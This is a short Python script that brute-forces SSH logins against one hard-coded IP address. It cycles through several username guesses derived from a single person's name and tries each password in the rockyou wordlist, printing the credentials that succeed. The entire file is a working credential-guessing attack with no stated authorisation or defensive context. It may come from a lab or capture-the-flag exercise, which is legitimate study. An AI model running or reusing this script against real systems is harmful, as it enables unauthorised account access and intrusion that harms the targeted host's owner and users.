import gzip
from pexpect import pxssh

shell = pxssh.pxssh()

host =  '142.93.118.186'
user_list = ['kruegster1990', 'fkruegster', 'kruegster', 'fredkruegster', 'fkrueger', 'krueger']

for user in user_list:
    print 'user: ' + user
    for word in gzip.open('/usr/share/wordlists/rockyou.txt.gz', 'rb'):
        word = word.strip()
        try:
            shell.login(host, user, word)
            print "Got it!"
            print (host, user, word)
            exit()
        except Exception:
            pass
